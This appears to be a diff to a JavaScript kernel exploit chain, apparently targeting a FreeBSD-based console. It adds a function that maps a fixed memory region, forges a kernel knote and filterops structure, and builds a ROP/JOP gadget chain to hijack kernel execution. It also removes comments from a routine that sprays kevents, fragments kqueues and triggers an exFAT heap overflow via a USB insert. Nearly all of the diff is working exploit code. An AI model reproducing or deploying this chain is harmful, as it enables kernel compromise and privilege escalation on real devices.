@@ -669,8 +669,109 @@ function test_rop(Chain) {
 //debug_log('Chain900');
 //test_rop(Chain);
 
-// malloc/free until the heap is shaped in a certain way, such that the exFAT
-// heap oveflow bug overwrites a knote
+function prepare_knote(kchain) {
+    const chain = new Chain();
+    const size = 0x4000 * 4;
+    // PROT_READ | PROT_WRITE
+    const prot_rw = 3;
+    const MAP_ANON = 0x1000;
+    const MAP_FIXED = 0x10;
+
+    chain.syscall(
+        'mmap',
+        0x4000,
+        size,
+        prot_rw,
+        MAP_ANON | MAP_FIXED,
+        0xffffffff,
+        0,
+    );
+    const knote = new Addr(chain.return_value);
+
+    debug_log(`knote addr: ${knote}`);
+    if (knote.low() !== 0x4000 && knote.high() !== 0) {
+        die('mmap() failed');
+    }
+
+    const filterops = knote.add(0x4000);
+    const jop_buffer = knote.add(0x8000);
+    const rax_ptrs = knote.add(0xc000);
+
+    const offset_kn_fop = 0x68;
+    knote.write64(0, jop_buffer);
+    knote.write64(offset_kn_fop, filterops);
+
+    const offset_f_detach = 0x10;
+    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));
+
+    jop_buffer.write64(0, rax_ptrs);
+
+    rax_ptrs.write64(0xe0, kchain.get_gadget(jop2));
+    rax_ptrs.write64(0x30, kchain.get_gadget(jop3));
+    rax_ptrs.write64(0x10, kchain.get_gadget(jop4));
+
+    rax_ptrs.write64(0, kchain.get_gadget('cli; jmp qword ptr [rax + 0x43]'));
+    rax_ptrs.write64(0x43, kchain.get_gadget(jop5));
+
+    rax_ptrs.write64(0x18, kchain.stack_addr);
+
+    const offset_kqueue_close_epi = 689;
+
+    const offset_socketops = 0x179f39f;
+
+    kchain.push_gadget('xchg rbp, rax; ret');
+
+    kchain.push_gadget('add rax, 8; ret');
+    kchain.push_get_retval();
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_kqueue_close_epi);
+    kchain.push_gadget('add rax, rdx; ret');
+
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+
+    kchain.push_get_retval();
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_constant(-8);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('xchg rbp, rax; ret');
+
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_socketops + 0x40);
+    kchain.push_gadget('add rax, rdx; ret');
+
+    kchain.push_get_retval();
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(kchain.get_gadget(k2jop1));
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_constant(0x4000);
+    kchain.push_gadget('pop rsi; ret');
+    kchain.push_constant("0xdeadbeefbeefdead");
+    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');
+
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.get_gadget('sti; ret'));
+    kchain.push_gadget('leave; jmp rcx');
+
+    chain.syscall('mlock', knote, size);
+
+    return [knote, size, jop_buffer, rax_ptrs];
+}
+
 function trigger_oob(kchain) {
     const chain = new Chain();
 
@@ -690,28 +791,19 @@ function trigger_oob(kchain) {
 
     const AF_INET = 2;
     const SOCK_STREAM = 1;
-    // socket file descriptor
+
     chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
     const sd = chain.return_value;
-    // We suspect why they want a specific file descriptor is because
-    // kqueue_expand() allocates memory whose size depends on the file
-    // descriptor number.
-    //
-    // The specific malloc size is probably a part in their method in shaping
-    // the heap.
-    //
-    // socket() returns an int (32-bit signed integer)
-    // if sd.high() !== 0, socket() returned an error
+
     if (sd.low() < 0x100 || sd.low() >= 0x200 || sd.high() !== 0) {
         die(`invalid socket: ${sd}`);
     }
     debug_log(`socket descriptor: ${sd}`);
 
-    // spray kevents
     const kevent = new Uint8Array(0x20);
     const kevent_p = get_view_vector(kevent);
     kevent_p.write64(0, sd);
-    // EV_ADD and EVFILT_READ
+
     kevent_p.write32(0x8, 0x1ffff);
     kevent_p.write32(0xc, 0);
     kevent_p.write64(0x10, Int.Zero);
@@ -725,7 +817,6 @@ function trigger_oob(kchain) {
     chain.run();
     chain.clean();
 
-    // fragment memory
     for (let i = 18; i < num_kqueue; i += 2) {
         chain.push_syscall('close', kqueues[i]);
     }
@@ -733,10 +824,8 @@ function trigger_oob(kchain) {
     chain.run();
     chain.clean();
 
-    // trigger OOB
     alert('insert USB');
 
-    // trigger corrupt knote
     for (let i = 1; i < num_kqueue; i += 2) {
         chain.push_syscall('close', kqueues[i]);
     }
